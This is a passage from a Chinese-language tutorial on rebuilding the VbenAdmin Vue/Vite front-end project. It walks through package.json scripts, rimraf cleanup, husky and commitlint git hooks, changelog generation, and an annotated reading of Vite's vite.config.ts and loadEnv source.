|| husky install\u0026#34;, // ... } 作用：這個是用來初始化husky的。啟用Git掛鉤。\n說明：如果不是CI服務器，就啟動Git鉤子。\ngen:icon 作用：生成圖標的，後面再說。\npostinstall 需先配置 husky\n代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34;, // ... } 作用：執行install:husky命令。這個命令會自動啟動Git鉤子，該操作參考：手動初始化husky和Yarn2下怎麼自動啟動Git鉤子函數。\n彙總 package.json除腳本、運行依賴、開發依賴外的字段參考官方文檔。\nyarn -v的腳本是後面要說的腳本。\npackage.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 { // ... \u0026#34;scripts\u0026#34;: { \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, \u0026#34;serve\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, \u0026#34;dev\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, \u0026#34;build\u0026#34;: \u0026#34;vite build\u0026#34;, \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, \u0026#34;report\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, \u0026#34;log\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;clean:cache\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;clean:lib\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, \u0026#34;lint:ls-lint\u0026#34;: \u0026#34;ls-lint\u0026#34;, \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, \u0026#34;test:gzip\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;test:br\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;reinstall\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34;, \u0026#34;gen:icon\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; }, // ... } 安裝rimraf 說明 由於手動刪除文件夾太慢了，需要實現腳本刪除文件。\n參考連結 rimraf的npm首頁\nrimraf的npm首頁說明：\nThe UNIX command rm -rf for node.\nInstall with npm install rimraf, or just drop rimraf.js somewhere.\n翻譯：\nnode版的Unix系統命令rm -rf。\n用npm安裝rimraf，或者直接把rimraf.js放在某個地方。\n雖然這裡可以通過import使用函數刪除文件，但是我們主要是使用它的命令行蛤。\n詳情查看：rimraf的npm首頁-Cil說明。\n安裝 1 yarn add rimraf --dev 重寫腳本 就是根目錄下package.json的scripts字段。\nclean:cache package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;clean:cache\u0026#34;: \u0026#34;rimraf node_modules/.cache/ \u0026amp;\u0026amp; rimraf node_modules/.vite\u0026#34;, // ... } 目的：刪除緩存，刪除node_modules/.cache/和node_modules/.vite下的文件。 clean:lib package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;clean:lib\u0026#34;: \u0026#34;rimraf node_modules\u0026#34;, // ... } 目的：清除依賴，刪除node_modules文件夾。 reinstall package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;reinstall\u0026#34;: \u0026#34;rimraf yarn.lock \u0026amp;\u0026amp; rimraf package.lock.json \u0026amp;\u0026amp; rimraf node_modules \u0026amp;\u0026amp; npm run bootstrap\u0026#34;, // ... } 目的：重新安裝依賴，該命令會先刪除 node_modules、yarn.lock、package.lock.json後在進行依賴重新安裝，速度會明顯變慢。 使用husky規范代碼提交 說明 使用Git提交代碼的時候，需要對暫存的代碼進行如下操作：\n進行lint操作。 對commit的消息進行格式化檢查。 進行prettier操作。 需要安裝的依賴有：husky、lint-staged、@commitlint/cli、@commitlint/config-conventional、pretty-quick、is-ci。\nhusky：可以在Git的鉤子函數中執行腳本。 lint-staged：針對暫存文件進行lint操作。 @commitlint/cli：對commit的消息進行格式檢查。 @commitlint/config-conventional：commit的消息檢查格式傳統配置，對應還有很多其他配置，比如angular的提交規範@commitlint/config-angular。 pretty-quick：針對暫存文件進行prettier操作。 is-ci：husky好像不能在ci環境下執行，這個依賴是用來判斷是不是ci環境的。 參考連結 husky的npm首頁 husky官方文檔 lint-staged的npm首頁 @commitlint/cli的npm首頁 @commitlint/cil官網 @commitlint/config-conventional的首頁 pretty-quick的npm首頁 Prettier官網對Git鉤子函數的支持說明 is-ci的npm首頁 前端代碼規範從0到1 前端工作流 安裝 1 yarn add husky lint-staged @commitlint/cli @commitlint/config-conventional pretty-quick is-ci --dev 配置commitlint commitlint官方配置說明 commitlint配置規則 在根目錄下創建commitlint.config.js文件。\ncommitlint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 module.exports = { // ↓ 忽略包含init的提交消息 ignores: [(commit) =\u0026gt; commit.includes(\u0026#39;init\u0026#39;)], // ↓ 按照传统消息格式来验证 extends: [\u0026#39;@commitlint/config-conventional\u0026#39;], // ↓ 这里是自定义解析器，看不太懂，直接搬代码吧 // ↓ https://commitlint.js.org/#/reference-configuration?id=parser-presets parserPreset: { parserOpts: { headerPattern: /^(\\w*|[\\u4e00-\\u9fa5]*)(?:[\\(\\（](.*)[\\)\\）])?[\\:\\：] (.*)/, headerCorrespondence: [\u0026#39;type\u0026#39;, \u0026#39;scope\u0026#39;, \u0026#39;subject\u0026#39;], referenceActions: [ \u0026#39;close\u0026#39;, \u0026#39;closes\u0026#39;, \u0026#39;closed\u0026#39;, \u0026#39;fix\u0026#39;, \u0026#39;fixes\u0026#39;, \u0026#39;fixed\u0026#39;, \u0026#39;resolve\u0026#39;, \u0026#39;resolves\u0026#39;, \u0026#39;resolved\u0026#39; ], issuePrefixes: [\u0026#39;#\u0026#39;], noteKeywords: [\u0026#39;BREAKING CHANGE\u0026#39;, \u0026#39;不兼容变更\u0026#39;], fieldPattern: /^-(.*?)-$/, revertPattern: /^Revert\\s\u0026#34;([\\s\\S]*)\u0026#34;\\s*This reverts commit (\\w*)\\./, revertCorrespondence: [\u0026#39;header\u0026#39;, \u0026#39;hash\u0026#39;], warn() {}, mergePattern: null, mergeCorrespondence: null } }, // ↓ 自定义提交消息规则 rules: { // ↓ body以空白行开头 \u0026#39;body-leading-blank\u0026#39;: [2, \u0026#39;always\u0026#39;], // ↓ footer以空白行开头 \u0026#39;footer-leading-blank\u0026#39;: [1, \u0026#39;always\u0026#39;], // ↓ header的最大长度 \u0026#39;header-max-length\u0026#39;: [2, \u0026#39;always\u0026#39;, 108], // ↓ subject为空 \u0026#39;subject-empty\u0026#39;: [2, \u0026#39;never\u0026#39;], // ↓ type为空 \u0026#39;type-empty\u0026#39;: [2, \u0026#39;never\u0026#39;], // ↓ type的类型 \u0026#39;type-enum\u0026#39;: [ 2, \u0026#39;always\u0026#39;, [ \u0026#39;feat\u0026#39;, \u0026#39;fix\u0026#39;, \u0026#39;perf\u0026#39;, \u0026#39;style\u0026#39;, \u0026#39;docs\u0026#39;, \u0026#39;test\u0026#39;, \u0026#39;refactor\u0026#39;, \u0026#39;build\u0026#39;, \u0026#39;ci\u0026#39;, \u0026#39;chore\u0026#39;, \u0026#39;revert\u0026#39;, \u0026#39;wip\u0026#39;, \u0026#39;workflow\u0026#39;, \u0026#39;types\u0026#39; ] ] } }; 配置husky 啟動Git鉤子 1 npx husky install 這個時候就在根目錄下創建了.husky目錄了。 vben將裡面的一個文件夾刪除了。\n修復YarnOnWindowsBug 官方參考連結\n在帶有Git Bash（stdin is not a tty）的Windows上使用Yarn時，Git掛鉤可能會失敗。如果您有Windows用戶，則強烈建議添加以下解決方法。\n創建.husky/common.sh： 1 2 3 4 5 6 7 8 command_exists () { command -v \u0026#34;$1\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 } # Workaround for Windows 10, Git Bash and Yarn if command_exists winpty \u0026amp;\u0026amp; test -t 1; then exec \u0026lt; /dev/tty fi 在使用Yarn運行命令的地方將其來源： 1 2 3 4 5 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/common.sh\u0026#34; yarn ... 這裡是yarn命令的地方要這樣用，其他地方要不要無所謂。第二步可以先不管。\n創建lint-staged的配置文件 lint:lint-staged package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34; } 作用：對Git暫存的文件進行lint檢查。\nlint:pretty package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34; } 作用：對Git暫存文件進行pretty的操作。\ninstall:husky package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34; } 作用：如果不是CI服務器，就啟動Git鉤子。\npostinstall package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; } 作用：執行install:husky命令。這個命令會自動啟動Git鉤子，參考文檔。\n給husky添加任務 npx的Git首頁，有命令行說明 commitlint的命令行說明 1 2 3 4 5 6 7 8 9 10 # 啟動husky yarn install:husky # 添加commit消息檢查任務到`.husky/commit-msg`文件中 # 這裡我一直執行不出來，是引號引其的問題，大家可以先創建空的然後把命令複製進去 # npx husky add .husky/commit-msg \u0026#39;npx --no-install commitlint --edit \u0026#34;$1\u0026#34;\u0026#39; npx husky add .husky/commit-msg # 創建一個任務文件 npx husky add .husky/pre-commit 手動修改.husky/commit-msg文件：\n這裡面的$1一定要用雙引號，不然後面執行會報錯。\n.husky/commit-msg 1 2 3 4 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; npx --no-install commitlint --edit \u0026#34;$1\u0026#34; 手動修改.husky/pre-commit文件：\n參考連結：\n在CI中禁用鉤子 在Windows上的Yarn 最後手動執行之前創建的腳本命令。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/common.sh\u0026#34; [ -n \u0026#34;$CI\u0026#34; ] \u0026amp;\u0026amp; exit 0 # Check the file name # ! ls-lint cannot be used normally in mac pro of M1 system. npm run lint:ls-lint # Format and submit code according to lintstagedrc.js configuration npm run lint:lint-staged npm run lint:pretty 測試 失敗測試 最好先重啟你的ide\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 git add . git commit -m \u0026#34;隨便打一些消息\u0026#34; \u0026gt; vben3@0.0.0 lint:ls-lint F:\\CodeLearn\\vben\\vben3 \u0026gt; ls-lint \u0026gt; vben3@0.0.0 lint:lint-staged F:\\CodeLearn\\vben\\vben3 \u0026gt; lint-staged -c ./.husky/lintstagedrc.js [STARTED] Preparing... # 一系列檢查... [SUCCESS] Cleaning up... \u0026gt; vben3@0.0.0 lint:pretty F:\\CodeLearn\\vben\\vben3 \u0026gt; pretty-quick --staged �🔍 Finding changed files since git revision 1346762. �🎯 Found 2 changed files. ✅ Everything is awesome! ⧗ input: 隨便打一些消息 ✖ subject may not be empty [subject-empty] ✖ type may not be empty [type-empty] ✖ found 2 problems, 0 warnings ⓘ Get help: https://github.com/conventional-changelog/commitlint/#what-is-commitlint husky - commit-msg hook exited with code 1 (error) 格式 出錯了，我們規範的提交消息試試：\n@commitlint/config-conventional的規範+我們自定義的規則。\ntype: some message\n類型英文 類型中文 build 建立 chore 雜事 ci ci docs 文檔 feat 壯舉 fix 修復 perf 敷衍 refactor 重構 revert 恢復 style 樣式 test 測試 成功測試 提交成功，當然你不用擔心這樣手敲太麻煩了，後面還有插件可以自動幫你敲這些格式。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 git commit -m \u0026#34;feat: 我們成功的規範了Git提交!\u0026#34; \u0026gt; vben3@0.0.0 lint:pretty F:\\CodeLearn\\vben\\vben3 \u0026gt; pretty-quick --staged �🔍 Finding changed files since git revision 1346762. �🎯 Found 2 changed files. ✅ Everything is awesome! [master 6c61fc5] feat: 我們成功的規範了Git提交! 7 files changed, 104 insertions(+), 4 deletions(-) create mode 100644 .husky/.gitignore create mode 100644 .husky/commit-msg create mode 100644 .husky/common.sh create mode 100644 .husky/lintstagedrc.js create mode 100644 .husky/pre-commit # 推送出去 git push -u origin master 使用conventional-changelog-cli生成變更記錄 說明 在VbenAdmin項目的腳本命令和根目錄中還有CHANGELOG.md這麼個文件，這是記錄我們項目變更記錄的MD。明顯不是手寫出來的，那麼怎麼生成？\n參考連結：\nconventional-changelog-cli的Git說明 conventional-changelog-cli的npm首頁 安裝 1 yarn add global conventional-changelog-cli --dev 配置腳本 package.json文件中的scripts字段。\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;log\u0026#34;: \u0026#34;conventional-changelog -p angular -i CHANGELOG.md -s\u0026#34;, // ... } 測試 1 yarn log 可以看見生成了CHANGELOG.md文件\n1 2 3 4 5 6 # 0.0.0 (2022-10-13) ### Features - 我们成功的规范了 Git 提交! ([6c61fc5](https://gitee.com/kuxiaoxin/vben3/commits/6c61fc5c0bc9d0ed551117eb00349ce82e35deea)) 命令列參數 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 \u0026gt; conventional-changelog --help Generate a changelog from git metadata Usage conventional-changelog Example conventional-changelog -i CHANGELOG.md --same-file Options -i, --infile Read the CHANGELOG from this file # 從這個文件中讀取CHANGELOG。 -o, --outfile Write the CHANGELOG to this file If unspecified, it prints to stdout # 將CHANGELOG寫入這個文件。 # 如果沒有指定，則打印到stdout。 -s, --same-file Outputting to the infile so you don\\\u0026#39;t need to specify the same file as outfile # 輸出到infile，所以你不需要指定與outfile相同的文件。 -p, --preset Name of the preset you want to use. Must be one of the following: angular, atom, codemirror, ember, eslint, express, jquery, jscs or jshint # 您要使用的預設名稱。必須是下列之一。 # angular, atom, codemirror, # ember, eslint, express, # jquery, jscs, jshint。 -k, --pkg A filepath of where your package.json is located Default is the closest package.json from cwd # 您的 package.json 所在的文件路徑。 # 默認為cwd中最接近的package.json。 -a, --append Should the newer release be appended to the older release Default: \\false # 是否應將較新的版本附加到較舊的版本上？ # 默認：不追加 -r, --release-count How many releases to be generated from the latest If 0, the whole changelog will be regenerated and the outfile will be overwritten Default: 1 # 將從最新的版本中生成多少個版本。 # 如果為0，整個變更日誌將被重新生成，並且輸出文件將被覆蓋。 # 默認值: 1 --skip-unstable If given, unstable tags will be skipped, e.g., x.x.x-alpha.1, x.x.x-rc.2 # 如果給定，將跳過不穩定的標籤，例如，x.x.x-alpha.1, x.x.x-rc.2。 -u, --output-unreleased Output unreleased changelog # 輸出未發布的變更日誌。 -v, --verbose Verbose output. Use this \\for debugging Default: \\false # Verbose 輸出。用來調試 # 默認：不輸出 -n, --config A filepath of your config script Example of a config script: https://github.com/conventional-changelog/conventional-changelog/blob/master/packages/conventional-changelog-cli/test/fixtures/config.js # 配置腳本的文件路徑。 # 配置腳本的例子： # https://github.com/conventional-changelog # /conventional-changelog/blob/master/packages # /conventional-changelog-cli/test/fixtures/config.js -c, --context A filepath of a json that is used to define template variables # 一個用於定義模板變量的json文件路徑。 -l, --lerna-package Generate a changelog \\for a specific lerna package (:pkg-name@1.0.0) # 為一個特定的lerna包生成一個變更日誌(:pkg-name@1.0.0) -t, --tag-prefix Tag prefix to consider when reading the tags # 讀取標籤時要考慮的標籤前綴。 --commit-path Generate a changelog scoped to a specific directory # 生成一個特定目錄下的變更日誌。 配置Vite 說明 本章只是準備，大家可以直接把VbenAdmin的vite.config.ts原代碼複製到我們的項目中。然後把報錯的地方註釋掉。接下來的章節會把這個文件一段一段的解析出來。章節做太長了大家應該也不喜歡看，至少我不喜歡看長文章。\n代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 import type { UserConfig, ConfigEnv } from \u0026#39;vite\u0026#39;; import { loadEnv } from \u0026#39;vite\u0026#39;; import { resolve } from \u0026#39;path\u0026#39;; // import { generateModifyVars } from \u0026#39;./build/config/themeConfig\u0026#39;; // import { createProxy } from \u0026#39;./build/vite/proxy\u0026#39;; // import { wrapperEnv } from \u0026#39;./build/utils\u0026#39;; // import { createVitePlugins } from \u0026#39;./build/vite/plugin\u0026#39;; // import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { const root = process.cwd() const env = loadEnv(mode, root) // The boolean type read by loadEnv is a string. This function can be converted to boolean type // const viteEnv = wrapperEnv(env); // const { VITE_PORT, VITE_PUBLIC_PATH, VITE_PROXY, VITE_DROP_CONSOLE, VITE_LEGACY } = viteEnv; // const isBuild = command === \u0026#39;build\u0026#39;; return { // base: VITE_PUBLIC_PATH, root, resolve: { alias: [ { // /@/xxxx =\u0026gt; src/xxx find: /^\\/@\\//, replacement: pathResolve(\u0026#39;src\u0026#39;) + \u0026#39;/\u0026#39; }, { // /#/xxxx =\u0026gt; types/xxx find: /^\\/#\\//, replacement: pathResolve(\u0026#39;types\u0026#39;) + \u0026#39;/\u0026#39; } ] }, server: { // port: VITE_PORT, // Load proxy configuration from .env // proxy: createProxy(VITE_PROXY), hmr: { overlay: true } }, build: { // minify: \u0026#39;esbuild\u0026#39;, // outDir: OUTPUT_DIR, // polyfillDynamicImport: VITE_LEGACY, terserOptions: { compress: { keep_infinity: true, // Used to delete console in production environment // drop_console: VITE_DROP_CONSOLE, }, }, // Turning off brotliSize display can slightly reduce packaging time brotliSize: false, chunkSizeWarningLimit: 1200 }, define: { // setting vue-i18-next // Suppress warning __VUE_I18N_LEGACY_API__: false, __VUE_I18N_FULL_INSTALL__: false, __INTLIFY_PROD_DEVTOOLS__: false }, css: { preprocessorOptions: { less: { modifyVars: { // Used for global import to avoid the need to import each style file separately // reference: Avoid repeated references hack: `true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;` // ...generateModifyVars(), }, javascriptEnabled: true } } }, // The vite plugin used by the project. The quantity is large, so it is separately extracted and managed // plugins: createVitePlugins(viteEnv, isBuild), optimizeDeps: { // @iconify/iconify: The dependency is dynamically and virtually loaded by @purge-icons/generated, so it needs to be specified explicitly include: [ \u0026#39;@iconify/iconify\u0026#39;, \u0026#39;ant-design-vue/es/locale/zh_CN\u0026#39;, \u0026#39;moment/dist/locale/zh-cn\u0026#39;, \u0026#39;ant-design-vue/es/locale/en_US\u0026#39;, \u0026#39;moment/dist/locale/eu\u0026#39;, ], exclude: [\u0026#39;vue-demi\u0026#39;] } } } Node的path.resolve方法 說明 psth.resolve([...paths])方法是NodeApi中path模塊的方法。\n參考連結 Node中文API path.resolve([\u0026hellip;paths])方法 path.resolve([\u0026hellip;path])方法在線運行 psth.resolve([\u0026hellip;pth])較通俗的理解 VbenAdmin原代碼 1 2 3 4 5 import { resolve } from \u0026#39;path\u0026#39; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir) } 代碼在項目中報錯 此時引入項目會報錯：找不到 path。\n因為我們沒有安裝node的聲明文件，ts裡面沒有。\n1 yarn add @types/node --dev 這個開發依賴在原VbenAdmin項目中沒有，是因為其他依賴中有這個依賴。\n但是我們現在還沒有安裝包含@types/node的依賴。\n剩下的依賴裡面有很多這樣的依賴，我們也不去猜是哪個依賴了。\n反正是一個開發依賴，我們直接自己手動安裝了。\nresolve方法 該方法百度上有兩種說法：\n從後向前，生成絕對路徑。 若字符以 / 開頭，不會拼接到前面的路徑（因為拼接到此已經是一個絕對路徑）。 若以 ../ 開頭，拼接前面的路徑，且不含最後一節路徑。 若以 ./ 開頭 或者沒有符號 則拼接前面路徑。 需要注意的是：如果在處理完所有給定的 path 片段之後還未生成絕對路徑，則再加上當前工作目錄。 每一個參數都理解為一個cd命令。最終cd到哪個路徑。返回該絕對路徑。 __dirname NodeApi的__dirname：當前模塊目錄名。\nNodeApi文檔-__dirname說明 __dirname在線運行 在線運行 1 2 3 4 5 6 const path = require(\u0026#39;path\u0026#39;) console.log(__dirname) console.log(path.resolve(__dirname, \u0026#39;.\u0026#39;, \u0026#39;src\u0026#39;)) // /tmp/B3YQQ1 // /tmp/B3YQQ1/src Vite的情景配置 說明 本章收集了一些Vite如何根據不同環境進行不同配置的資料。\n參考連結 Vite的中文首頁 Vite的英文首頁 Vite的情景配置說明 代碼 總之不管使用什麼方式配置Vite，最後返回的就只是一個對象。對像中包含Vite配置的細節。\n1 2 3 4 5 6 7 8 9 10 11 export default ({ command, mode }) =\u0026gt; { if (command === \u0026#34;serve\u0026#34;) { return { // serve 獨有配置 } } else { return { // build 獨有配置 } } } 參數說明 vite目前只有vite、vite build、vite preview這三種命令。以下是這三種命令的command和mode的值。\nvite command：serve mode：development vite build command：build mode：production vite preview command：serve mode：development Node的process 說明 返回 Node.js 進程的當前工作目錄。\n參考連結 Node中文文檔-process Node中文文檔-process.cwd()方法 在線運行process.cwd() 代碼 1 process.cwd() Vite的loadEnv方法 說明 檢查process.cwd()路徑下.env.development.local、.env.development、.env.local、.env這四個環境文件。 輸出NODE_ENV和VITE_開頭的鍵值對。 VITE_開頭的鍵值對後面的不會覆蓋前面的。 NODE_ENV的值後面的會覆蓋前面的。 參考連結 NodeApi中文文檔-process NodeApi中文文檔-process-env說明 NodeApi中文文檔-path NodeApi中文文檔-path.join()方法 NodeApi中文文檔-path.dirname()方法 NodeApi中文文檔-fs NodeApi中文文檔-fs.existsSync()方法 NodeApi中文文檔-fs.statSync()方法 NodeApi中文文檔-fs.readFileSync()方法 Node-process-env在線運行 Linux手冊頁-environ(7) Vite項目下.env系列文件命名的意義-中文文檔 Vite項目下.env系列文件命名的意義-英文文檔 原始碼 前置代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // ↓ 加載node的path模塊 var path$1 = require(\u0026#39;path\u0026#39;); var fs$2 = require(\u0026#39;fs\u0026#39;); // ↓ 傳入的如果是一個包含\u0026#39;default\u0026#39;的key的對象，則輸出對象的\u0026#39;default\u0026#39;的key對應的value。 function _interopDefaultLegacy (e) { return e \u0026amp;\u0026amp; typeof e === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; \u0026#39;default\u0026#39; in e ? e[\u0026#39;default\u0026#39;] : e; } // ↓ 結合上面二者 var path__default = /*#__PURE__*/_interopDefaultLegacy(path$1); var fs__default = /*#__PURE__*/_interopDefaultLegacy(fs$2); // ↓ 檢查dir下是否有formats中的路徑，返回有就返迴路徑或者文件 function lookupFile(dir, formats, pathOnly = false) { for (const format of formats) { // ↓ 輸出dir和formats連接後的路徑 const fullPath = path__default.join(dir, format); // ↓ 同步的檢查該路徑是否存在，並且該路徑對應的是一個文件 if (fs__default.existsSync(fullPath) \u0026amp;\u0026amp; fs__default.statSync(fullPath).isFile()) { // ↓ 是否只要輸出路徑，否則輸出文件 return pathOnly ? fullPath : fs__default.readFileSync(fullPath, \u0026#39;utf-8\u0026#39;); } } // ↓ 上面的路徑都不滿足輸出條件，那麼再檢查一遍檢查傳入的dir的目錄名 const parentDir = path__default.dirname(dir); if (parentDir !== dir) { return lookupFile(parentDir, formats, pathOnly); } } 代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 // 從傳參的root目錄下獲取 // 按順序 .env.${mode}.local、.env.${mode}、.env.local、.env這四個環境文件 // 輸出文件內配置的對象 function loadEnv(mode, root, prefix = \u0026#39;VITE_\u0026#39;) { if (mode === \u0026#39;local\u0026#39;) { // ↓ 如果第一個參數傳入\u0026#39;local\u0026#39;，就報錯： // ↓ \u0026#34;local \u0026#34;不能用作模式名稱，因為它與``.env文件的.local後綴衝突。 throw new Error(`\u0026#34;local\u0026#34; cannot be used as a mode name because it conflicts with ` + `the .local postfix for .env files.`); } // ↓ 待輸出的環境變量對象 const env = {}; // ↓ 要讀取的四個文件名稱的字符串數組 const envFiles = [ /** mode local file */ `.env.${mode}.local`, /** mode file */ `.env.${mode}`, /** local file */ `.env.local`, /** default file */ `.env` ]; // ↓ 檢查是否有實際的以VITE_*開頭的環境變量。 // ↓ 這些通常是Node內聯提供的env對象，並應優先考慮。 for (const key in process.env) { if (key.startsWith(prefix) \u0026amp;\u0026amp; env[key] === undefined) { env[key] = process.env[key]; } } for (const file of envFiles) { // ↓ 檢查根目錄下是否有指定配置文件 const path = lookupFile(root, [file], true); if (path) { // ↓ 以換行為單位輸出文件中KEY=VAL格式的到結果對像中 const parsed = main$2.parse(fs__default.readFileSync(path), { debug: !!process.env.DEBUG || undefined }); // ↓ 讓環境變量互相使用，這個方法我沒仔細研究。不是很懂 main$1({ parsed, // ↓ 防止process.env修改 ignoreProcessEnv: true }); // ↓ 只輸出以prefix開頭的key for (const [key, value] of Object.entries(parsed)) { // ↓ 只有這個key在前面沒有加載過才賦值 if (key.startsWith(prefix) \u0026amp;\u0026amp; env[key] === undefined) { env[key] = value; } else if (key === \u0026#39;NODE_ENV\u0026#39;) { // ↓ 在.env文件中覆蓋NODE_ENV。 process.env.VITE_USER_NODE_ENV = value; } } } } return env; } Vben中的wrapperEnv方法 說明 1 2 // The boolean type read by loadEnv is a string. This function can be converted to boolean type const viteEnv = wrapperEnv(env); 翻譯如下：\nloadEnv讀取的布爾類型是一個字符串。該函數可以轉換為布爾類型。\n創建wrapperEnv方法 從這開始涉及到根目錄下的build文件夾了。創建該文件夾。我們使用build文件夾裝所有關於項目構建類的東西。\n創建定義文件 根目錄下的build文件夾創建typeing.d.ts文件。\ntypeing.d.ts 1 2 3 4 5 6 declare module \u0026#39;*.json\u0026#39; { const src: any; export default src; } declare type Recordable = Record\u0026lt;string, any\u0026gt;; 參考連結 TS通用模塊聲明 TS的高級類型Record 允許導入Json這段代碼，寫在哪都行。 TS都會加載到。 定義Env對像類型 根目錄下的build文件夾創建utils.ts文件。\nutils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 export interface ViteEnv { VITE_PORT: number VITE_USE_MOCK: boolean VITE_USE_PWA: boolean VITE_PUBLIC_PATH: string VITE_PROXY: [string, string][] VITE_GLOB_APP_TITLE: string VITE_GLOB_APP_SHORT_NAME: string VITE_USE_CDN: boolean VITE_DROP_CONSOLE: boolean VITE_BUILD_COMPRESS: \u0026#39;gzip\u0026#39; | \u0026#39;brotli\u0026#39; | \u0026#39;none\u0026#39; VITE_LEGACY: boolean VITE_USE_IMAGEMIN: boolean } 導出的這個類型對應了我們配置文件中的Key。\n格式化Env對象的wrapperEnv方法 在utils.ts文件中添加以下方法：\nutils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export function wrapperEnv(envConf: Recordable): ViteEnv { const ret: any = {}; for (const envName of Object.keys(envConf)) { let realName = envConf[envName].replace(/\\\\n/g, \u0026#39;\\n\u0026#39;); realName = realName === \u0026#39;true\u0026#39; ? true : realName === \u0026#39;false\u0026#39; ? false : realName; if (envName === \u0026#39;VITE_PORT\u0026#39;) { realName = Number(realName); } if (envName === \u0026#39;VITE_PROXY\u0026#39;) { try { realName = JSON.parse(realName); } catch (error) {} } ret[envName] = realName; process.env[envName] = realName; } return ret; } 代碼說明： 中間的正則替換就是將\\\\n替換成\\n，複製下面這些代碼可以去瀏覽器中體驗一下。 